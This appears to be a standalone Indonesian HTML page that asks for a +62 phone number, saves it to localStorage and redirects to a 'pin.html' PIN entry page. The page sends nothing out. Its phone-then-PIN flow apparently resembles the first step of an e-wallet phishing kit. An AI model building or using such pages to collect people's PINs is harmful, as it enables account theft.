<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>Masukkan Nomor HP</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body { background-color: #008CFF; color: white; font-family: sans-serif; text-align: center; padding: 30px; }
    .form-box { background: white; padding: 20px; border-radius: 12px; color: #000; max-width: 350px; margin: auto; }
    input, button { width: 90%; padding: 10px; font-size: 16px; border-radius: 8px; margin: 10px 0; }
    button { background-color: #007AFF; color: white; border: none; }
  </style>
</head>
<body>
  <h2>Masukkan Nomor HP</h2>
  <div class="form-box">
    <label>+62</label>
    <input type="tel" id="nomor" placeholder="8123456789" maxlength="13" />
    <button onclick="lanjut()">LANJUTKAN</button>
  </div>

  <script>
    function lanjut() {
      const nomor = document.getElementById('nomor').value;
      if (!nomor) return alert("Masukkan nomor HP!");

      localStorage.setItem("nomorHP", "+62" + nomor);
      window.location.href = "pin.html"; // halaman isi PIN
    }
  </script>
</body>
</html>
